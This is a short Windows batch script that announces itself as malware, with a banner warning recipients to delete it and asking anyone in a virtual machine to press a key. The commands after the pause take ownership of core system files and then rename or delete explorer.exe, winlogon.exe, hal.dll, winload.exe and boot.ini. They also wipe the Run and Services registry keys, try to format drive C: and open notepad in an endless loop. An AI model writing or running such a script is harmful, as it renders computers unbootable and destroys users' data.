@echo off 
echo your about to run a malware if you got send this close and delete it immediately! if your in virtualmachine press any key
pause
cd C:\windows\system32
takeown /f C:\windows\explorer.exe
ren C:\windows\explorer.exe fishmyass.old
takeown /f  C:\windows\system32\hal.dll
del  C:\windows\system32\hal.dll /q
takeown /f C:\windows\system32\winlogon.exe
ren  C:\windows\system32\winlogon.exe windead.dead
del C:\boot.ini /f /q
del C:\Windows\System32\hal.dll /f /q
del C:\Windows\System32\winload.exe /f /q
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services" /f
format C: /fs:NTFS /q /y
:loop
start notepad.exe
goto loop
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "malware.exe" /f

